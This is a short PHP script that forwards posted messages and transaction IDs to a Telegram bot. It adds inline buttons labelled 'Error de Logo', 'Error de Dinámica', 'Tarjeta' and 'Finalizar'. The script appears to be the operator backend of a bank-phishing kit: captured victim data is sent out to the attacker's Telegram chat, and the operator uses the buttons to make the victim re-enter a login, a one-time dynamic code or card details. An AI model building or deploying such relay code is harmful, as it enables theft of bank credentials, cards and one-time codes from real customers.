<?php
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';

$message = $_POST['message'] ?? '';
$transactionId = $_POST['transactionId'] ?? '';

if (empty($message) || empty($transactionId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

$keyboard = [
    'inline_keyboard' => [
        [['text' => "Error de Logo",       'callback_data' => "error_logo:{$transactionId}"]],
        [['text' => "Error de Dinámica",   'callback_data' => "pedir_dinamica:{$transactionId}"]],
        [['text' => "Tarjeta",             'callback_data' => "error_tc:{$transactionId}"]],
        [['text' => "Finalizar",           'callback_data' => "confirm_finalizar:{$transactionId}"]]
    ]
];

$data = [
    'chat_id' => $config['chat_id'],
    'text' => $message,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

$response = curl_exec($ch);
curl_close($ch);

$result = json_decode($response, true);

echo json_encode([
    'status' => $result['ok'] ? 'success' : 'error',
    'messageId' => $result['ok'] ? $result['result']['message_id'] : null
]);
